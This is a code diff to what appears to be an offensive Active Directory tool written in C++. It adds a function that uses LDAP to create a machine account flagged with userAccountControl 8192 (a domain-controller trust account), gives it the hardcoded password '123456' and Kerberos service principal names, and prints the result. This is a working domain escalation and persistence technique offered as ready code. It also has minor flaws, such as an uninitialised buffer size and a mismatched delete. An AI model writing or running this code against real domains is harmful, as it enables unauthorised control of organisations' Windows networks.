@@ -282,7 +282,6 @@ vector<string> LDAP_API::search(string filterGrammar, string dn, PCHAR searchAtt
 		// exit(-1);
 	}
 	return vString;
-	
 }
 
 void LDAP_API::searchConstrainedDelegation(){
@@ -386,6 +385,81 @@ string LDAP_API::addComputer(string pcName){
 		vector<string> vString = this->getObjectSid(pcName);
 		return vString[0];
 	}else{
+		cout << "[-] LDAP::addComputer Add Failed, The Error is " << dwRet << endl;
+		delete bv.bv_val;
+		return "";
+	}
+}
+
+string LDAP_API::addComputerUac8192(string pcName){
+	DWORD dwComputerSize;
+	TCHAR currentComputerName[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
+	GetComputerName(currentComputerName, &dwComputerSize);
+
+	regex_constants::match_flag_type fonly = regex_constants::format_first_only;
+	regex matchString(currentComputerName);
+
+	string computerDnString = this->getComputerDn();
+	cout << "[+] Getting computerDn ----> " << computerDnString << endl;
+	string addComputerDnString = regex_replace(computerDnString, matchString, pcName, fonly);
+	LDAPMod m1, m2, m3, m4, m5, m6;
+	string dnsHostNameString = pcName + "." + this->domainName;
+	TCHAR* dnsHostNameVals[] = { (TCHAR*)dnsHostNameString.c_str(), NULL };
+	m1.mod_op = LDAP_MOD_ADD;
+	m1.mod_type = "DnsHostName";
+	m1.mod_values = dnsHostNameVals;
+
+	string samAccountNameString = pcName + "$";
+	TCHAR* samAccountNameVals[] = { (TCHAR*)samAccountNameString.c_str(), NULL };
+	m2.mod_op = LDAP_MOD_ADD;
+	m2.mod_type = "SamAccountName";
+	m2.mod_values = samAccountNameVals;
+
+	TCHAR* userAccountControlVals[] = { "8192", NULL };
+	m3.mod_op = LDAP_MOD_ADD;
+	m3.mod_type = "userAccountControl";
+	m3.mod_values = userAccountControlVals;
+
+	string unicodePwdString = "\"123456\"";
+	BerValue bv;
+	bv.bv_val = new char[(unicodePwdString.length()) * 2];
+	memset(bv.bv_val, 0, unicodePwdString.length() * 2);
+	for (UINT i = 0; i < unicodePwdString.length(); i++) {
+		bv.bv_val[i * 2] = unicodePwdString[i];
+	}
+	bv.bv_len = unicodePwdString.length() * 2;
+	BerValue* unicodePwdVals[] = { &bv, NULL };
+	m4.mod_op = LDAP_MOD_ADD | LDAP_MOD_BVALUES;
+	m4.mod_type = "unicodePwd";
+	m4.mod_bvalues = unicodePwdVals;
+
+	TCHAR* objectClassVals[] = { "Computer", NULL };
+	m5.mod_op = LDAP_MOD_ADD;
+	m5.mod_type = "objectClass";
+	m5.mod_values = objectClassVals;
+
+	string a1 = "HOST/" + pcName + "." + this->domainName;
+	string a2 = "RestrictedKrbHost/" + pcName + "." + this->domainName;
+	string a3 = "HOST/" + pcName;
+	string a4 = "RestrictedKrbHost/" + pcName;
+
+	TCHAR* servicePrincipalNameVals[] = { (TCHAR*)a1.c_str(), (TCHAR*)a2.c_str(), (TCHAR*)a3.c_str(), (TCHAR*)a4.c_str(), NULL };
+	m6.mod_op = LDAP_MOD_ADD;
+	m6.mod_type = "ServicePrincipalName";
+	m6.mod_values = servicePrincipalNameVals;
+
+	LDAPMod* pModAttrs[7] = { &m1, &m2, &m3, &m4, &m5, &m6, NULL };
+	//string userSid = this->getCurrentUserSid();
+	//MACHINE_ACCOUNT_ATTRIBUTE machineAccountAttribute;
+
+	DWORD dwRet = ldap_add_ext_s(this->pLdapInstance, (PSTR)addComputerDnString.c_str(), pModAttrs, NULL, NULL);
+	if (dwRet == LDAP_SUCCESS){
+		cout << "[+] LDAP::addComputer Add Successed, Password is 123456" << endl;
+		delete bv.bv_val;
+		vector<string> vString = this->getObjectSid(pcName);
+		return vString[0];
+	}
+	else{
 		cout << "[-] LDAP::addComputer Add Failed, The Error is " << dwRet << endl;
 		delete bv.bv_val;
 		return "";
